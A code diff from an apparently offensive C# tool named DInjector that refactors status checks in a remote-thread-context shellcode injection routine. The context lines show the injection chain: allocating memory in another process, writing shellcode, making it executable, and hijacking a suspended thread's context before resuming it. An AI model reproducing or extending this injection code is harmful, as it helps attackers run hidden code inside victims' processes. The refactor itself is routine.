@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -34,7 +35,7 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -55,7 +56,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtWriteVirtualMemory");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtWriteVirtualMemory: {ntstatus}");
@@ -75,7 +76,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
@@ -102,7 +103,7 @@ namespace DInjector
                 0,
                 IntPtr.Zero);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED: {ntstatus}");
@@ -118,7 +119,7 @@ namespace DInjector
                 hThread,
                 ref ctx);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtGetContextThread");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtGetContextThread: {ntstatus}");
@@ -133,7 +134,7 @@ namespace DInjector
                 hThread,
                 ref ctx);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtSetContextThread");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtSetContextThread: {ntstatus}");
@@ -148,7 +149,7 @@ namespace DInjector
                 hThread,
                 ref suspendCount);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadContext) [+] NtResumeThread");
             else
                 Console.WriteLine($"(RemoteThreadContext) [-] NtResumeThread: {ntstatus}");
